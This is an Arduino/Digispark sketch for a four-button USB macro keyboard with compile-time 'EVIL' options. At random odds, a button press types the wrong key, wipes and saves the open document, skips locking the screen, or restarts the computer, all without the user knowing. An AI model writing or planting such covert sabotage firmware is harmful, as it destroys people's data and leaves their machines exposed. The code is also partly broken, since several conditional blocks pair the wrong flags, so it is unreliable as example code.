#include "DigiKeyboard.h"

#include "key_definitions.h"

#define PIN_A 5
#define PIN_B 2
#define PIN_C 1
#define PIN_D 0

#define EVIL_A
#define EVIL_B
#define EVIL_C
#define EVIL_D

// chance: 1/x
#define EVIL_A_CHANCE 5
#define EVIL_B_CHANCE 20
#define EVIL_C_CHANCE 100
#define EVIL_D_CHANCE 1000

void keyPressA(void);
void keyPressB(void);
void keyPressC(void);
void keyPressD(void);

unsigned long task;
bool previousState_a;
bool previousState_b;
bool previousState_c;
bool previousState_d;

// the setup routine runs once when you press reset:
void setup() 
{                
  // initialize pins (buttons)
  pinMode(PIN_A, INPUT_PULLUP);
  pinMode(PIN_B, INPUT_PULLUP);
  pinMode(PIN_C, INPUT_PULLUP);
  pinMode(PIN_D, INPUT_PULLUP); 

  DigiKeyboard.sendKeyStroke(0);
  
  task = millis() + 1;
  previousState_a = HIGH;
  previousState_b = HIGH;
  previousState_c = HIGH;
  previousState_d = HIGH;
}

void loop() 
{
  if(millis() >= task)
  {
    task++;
    bool state_a = digitalRead(PIN_A);
    bool state_b = digitalRead(PIN_B);
    bool state_c = digitalRead(PIN_C);
    bool state_d = digitalRead(PIN_D);

    if(state_a == LOW && previousState_a == HIGH)
    {
      keyPressA();
    }
    if(state_b == LOW && previousState_b == HIGH)
    {
      keyPressB();
    }
    if(state_c == LOW && previousState_c == HIGH) 
    {
      keyPressC();
    }
    if(state_d == LOW && previousState_d == HIGH) 
    {
      keyPressD();
    }

    previousState_a = state_a;
    previousState_b = state_b;
    previousState_c = state_c;
    previousState_d = state_d;
  }
}

void keyPressA(void)
{
  #ifdef EVIL_A
  if(random(EVIL_A_CHANCE) == 0)
  {
    DigiKeyboard.sendKeyStroke(KEY_B);
  }
  else
  {
  #endif
    DigiKeyboard.sendKeyStroke(KEY_A);
  #ifdef EVIL_A
  }
  #endif
}

void keyPressB(void)
{
  #ifdef EVIL_B
  if(random(EVIL_B_CHANCE) == 0)
  {
    // Select everything, delete, save, close
    DigiKeyboard.sendKeyStroke(KEY_A , MOD_CONTROL_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_DELETE);
    DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_F4 ,  MOD_ALT_LEFT);
  }
  else
  {
  #endif
    DigiKeyboard.sendKeyStroke(KEY_V , MOD_CONTROL_LEFT);
  #ifdef EVIL_A
  }
  #endif
}

void keyPressC(void)
{
  #ifdef EVIL_C
  if(random(EVIL_C_CHANCE) == 0)
  {
    // nothing, don't lock the computer, letting others do nasty stuff to the computer
  }
  else
  {
  #endif
    DigiKeyboard.sendKeyStroke(KEY_L , MOD_GUI_LEFT);
  #ifdef EVIL_A
  }
  #endif
}

void keyPressD(void)
{
  #ifdef EVIL_A
  if(random(EVIL_A_CHANCE) == 0)
  {
    // Restart computer
    DigiKeyboard.sendKeyStroke(KEY_DELETE , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_UP);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.sendKeyStroke(KEY_UP);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }
  else
  {
  #endif
    DigiKeyboard.sendKeyStroke(KEY_DELETE, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  #ifdef EVIL_A
  }
  #endif
}
